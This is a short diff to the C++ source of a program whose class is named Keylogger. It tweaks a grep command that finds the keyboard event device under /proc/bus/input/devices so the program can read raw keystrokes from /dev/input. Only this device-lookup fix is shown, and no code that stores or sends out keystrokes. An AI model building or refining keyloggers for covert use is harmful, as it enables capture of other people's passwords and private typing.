@@ -129,7 +129,7 @@ void Keylogger::process_keys() {
 std::string Keylogger::get_keyboard_path() {
     // TODO: find a better way to do this
     std::string device_name =
-        exec("grep -A 4 ^N.*[kK]eyboard /proc/bus/input/devices | grep -o event[0-9]");
+        exec("grep -A 4 -m 1 ^N.*[kK]eyboard /proc/bus/input/devices | grep -o event[0-9]");
     device_name.insert(0, "/dev/input/");
     device_name.erase(
         device_name.find('\n')); // just in case there's a newline character at the end
